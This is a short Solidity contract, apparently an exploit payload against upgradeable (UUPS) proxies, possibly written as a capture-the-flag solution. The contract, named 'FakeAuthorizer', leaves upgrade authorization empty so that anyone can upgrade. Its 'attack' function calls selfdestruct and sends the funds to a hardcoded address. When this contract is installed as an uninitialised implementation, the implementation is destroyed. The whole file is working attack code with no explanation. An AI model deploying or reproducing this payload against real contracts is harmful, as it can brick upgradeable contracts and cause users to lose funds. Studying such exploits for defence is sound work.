//SPDX-License-Identifier:MIT

pragma solidity ^0.8.0;
import "@openzeppelin/contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol";

contract FakeAuthorizer is UUPSUpgradeable {
    function attack() public {
        address payable addr = payable(
            address(0x76E2cFc1F5Fa8F6a5b3fC4c8F4788F0116861F9B)
        );
        selfdestruct(addr);
    }

    function _authorizeUpgrade(address imp) internal override {}
}
